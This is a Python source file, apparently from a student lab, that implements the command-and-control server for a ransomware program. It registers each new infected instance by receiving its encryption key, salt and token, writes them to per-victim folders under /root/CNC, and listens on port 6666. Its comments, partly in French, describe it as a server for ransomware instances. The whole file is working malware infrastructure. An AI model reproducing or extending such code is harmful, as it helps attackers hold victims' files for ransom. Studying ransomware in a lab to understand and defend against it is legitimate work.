import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import json

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field
        token=str(base64.b64decode(token).hex())
        path=os.path.join(CNC.ROOT_PATH,token)
        if not os.path.exists(path):
            os.mkdir(path)

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        # Elle doit créer un répertoire à partir du token et y stocker la clef et le sel dans 2 fichiers .bin
        # ici on utilise pas param
        try:
            key=body['key']
            salt=body['salt']
            token=body['token']
             # creer dossier portant le nom du token et créer deux fichiers : key.bin et salt.bin
            self.save_b64(token, key,'key.bin')
            self.save_b64(token, salt,'salt.bin')
            self.log_message(f'New [token, salt]:[{token,salt}]')
            # self.write(json.dumps(body))
            return {'status':'ok'}
        except Exception as excp:
            self.log_message(f'Exception Error {excp}')
            return {'status':'error'}
            
       
        

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()